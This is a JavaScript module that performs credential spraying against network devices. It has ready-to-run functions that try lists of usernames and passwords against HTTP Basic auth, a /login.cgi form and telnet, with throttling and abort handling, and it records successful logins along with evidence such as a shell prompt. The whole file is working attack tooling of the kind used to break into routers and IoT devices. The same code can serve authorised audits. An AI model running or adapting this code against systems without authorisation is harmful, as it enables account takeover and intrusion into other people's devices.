import net from 'net';

export const sleep = (ms) => process.env.NODE_ENV === 'test' ? Promise.resolve() : new Promise(resolve => setTimeout(resolve, ms));

/**
 * Shared helper to iterate through credentials with delay and abort checking.
 */
async function forEachCredential(credentials, signal, delayMs, fn) {
  const hits = [];

  for (const { user, pass } of credentials) {
    if (signal.aborted) throw new Error('Aborted');
    await sleep(delayMs);

    const result = await fn({ user, pass });
    if (!result) continue;

    if (result.hit) hits.push(result.hit);
    if (result.abort) break;
  }

  return hits;
}

/**
 * Helper to perform a fetch with a timeout that also respects an outer AbortSignal.
 */
async function fetchWithTimeout(url, opts, timeoutMs, outerSignal) {
  const controller = new AbortController();
  
  // Propagate outer signal abortion
  if (outerSignal?.aborted) {
    controller.abort(outerSignal.reason);
  }

  const timeoutId = setTimeout(() => {
    if (!controller.signal.aborted) {
      controller.abort(new Error('Request timed out'));
    }
  }, timeoutMs);

  const forwardAbort = (event) => {
    if (!controller.signal.aborted) {
      controller.abort(outerSignal.reason ?? event?.target?.reason);
    }
  };

  if (outerSignal) {
    outerSignal.addEventListener('abort', forwardAbort, { once: true });
  }

  try {
    return await fetch(url, {
      ...opts,
      signal: controller.signal
    });
  } finally {
    clearTimeout(timeoutId);
    if (outerSignal) {
      outerSignal.removeEventListener('abort', forwardAbort);
    }
  }
}

export async function sprayHttpBasic(ip, port, credentials, signal, delayMs, timeoutMs) {
  const targetUrl = `http://${ip}:${port}/`;

  return forEachCredential(credentials, signal, delayMs, async ({ user, pass }) => {
    const authHeader = 'Basic ' + Buffer.from(`${user}:${pass}`).toString('base64');

    try {
      const response = await fetchWithTimeout(targetUrl, {
        method: 'GET',
        headers: {
          'Authorization': authHeader
        }
      }, timeoutMs, signal);

      if (response.status >= 200 && response.status < 300) {
        return { hit: { user, pass, evidence: `HTTP ${response.status} OK (was 401)` } };
      }
      if (response.status === 401 || response.status === 403) {
        return null;
      }
      return null;
    } catch (err) {
      if (err.name === 'AbortError' || err.message === 'Aborted') {
        if (signal.aborted) throw new Error('Aborted');
        return { abort: true };
      }
      if (err.code === 'ECONNREFUSED' || err.cause?.code === 'ECONNREFUSED' || err.message.includes('fetch failed')) {
        return { abort: true };
      }
      return null;
    }
  });
}

async function isSuccessfulFormLogin(response) {
  if (response.status === 301 || response.status === 302) return true;
  if (response.status !== 200) return false;

  const body = (await response.text()).toLowerCase();
  if (body.includes('incorrect') || body.includes('invalid') || body.includes('failed')) return false;
  return true;
}

export async function sprayHttpForm(ip, port, opts, credentials, signal, delayMs, timeoutMs) {
  const targetUrl = `http://${ip}:${port}/login.cgi`;

  return forEachCredential(credentials, signal, delayMs, async ({ user, pass }) => {
    const postData = `username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;

    try {
      const response = await fetchWithTimeout(targetUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: postData,
        redirect: 'manual'
      }, timeoutMs, signal);

      if (await isSuccessfulFormLogin(response)) {
        return { hit: { user, pass, evidence: `HTTP ${response.status} Success/Redirect on form` } };
      }
      return null;
    } catch (err) {
      if (err.name === 'AbortError' || err.message === 'Aborted') {
        if (signal.aborted) throw new Error('Aborted');
        return { abort: true };
      }
      return { abort: true };
    }
  });
}

function attemptTelnetLogin(ip, port, user, pass, signal, timeoutMs) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    let buffer = '';
    let phase = 'login'; // 'login', 'password', 'done'

    socket.setTimeout(timeoutMs);

    socket.on('data', (data) => {
      buffer += data.toString('utf8');
      const lowerBuf = buffer.toLowerCase();

      if (phase === 'login' && (lowerBuf.includes('login') || lowerBuf.includes('user'))) {
        socket.write(user + '\r\n');
        buffer = '';
        phase = 'password';
      } else if (phase === 'password' && (lowerBuf.includes('password') || lowerBuf.includes('pass'))) {
        socket.write(pass + '\r\n');
        buffer = '';
        phase = 'done';
      } else if (phase === 'done') {
        if (/[#\$>%](\s)?$/.test(lowerBuf)) {
          socket.destroy();
          resolve({ success: true, evidence: `Telnet prompt matched: ${lowerBuf.trim().slice(-10)}` });
        } else if (lowerBuf.includes('incorrect') || lowerBuf.includes('invalid') || lowerBuf.includes('failed')) {
          socket.destroy();
          resolve({ success: false });
        }
      }
    });

    socket.on('error', () => { socket.destroy(); resolve({ success: false, abort: true }); });
    socket.on('timeout', () => { socket.destroy(); resolve({ success: false, abort: true }); });
    socket.on('close', () => resolve({ success: false }));

    const abortHandler = () => socket.destroy();
    signal.addEventListener('abort', abortHandler, { once: true });

    socket.connect(port, ip);
  });
}

export async function sprayTelnet(ip, port, credentials, signal, delayMs, timeoutMs) {
  return forEachCredential(credentials, signal, delayMs, async ({ user, pass }) => {
    try {
      const result = await attemptTelnetLogin(ip, port, user, pass, signal, timeoutMs);

      if (result.success) {
        return { hit: { user, pass, evidence: result.evidence } };
      }
      if (result.abort) {
        return { abort: true };
      }
      return null;
    } catch {
      return { abort: true };
    }
  });
}
